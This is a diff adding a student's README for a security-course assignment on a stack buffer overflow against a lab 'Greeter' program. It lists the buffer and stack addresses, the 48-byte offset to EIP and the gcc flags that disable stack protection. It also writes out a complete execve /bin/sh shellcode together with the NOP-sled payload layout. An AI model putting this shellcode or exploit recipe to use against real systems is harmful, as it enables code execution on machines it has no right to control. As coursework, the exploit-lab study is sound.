@@ -1,0 +1,28 @@
+Kleanthis Kyriazakis
+2015030086
+kkyriazakis
+
+Assignment 8
+
+Greeter program:
+	ESP Stack pointer	: 0xffffcf50
+	Buffer address		: 0xffffcf5c
+	
+	buffer + 48 bytes -> EIP
+	
+	
+shellcode_test.c:
+	build with
+		gcc -z execstack shellcode_test.c -m32 -o shellcode_test
+	
+	execute
+		./shellcode_test
+		
+	a shell should spawn
+	
+	
+payload_generator.py:
+	Uses same shellcode as shellcode_test ("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
+	Sets EIP as 0xffffcf60 (little indian)
+	Sets remaining positions (48 - 21 = 27)as NOP operations
+	
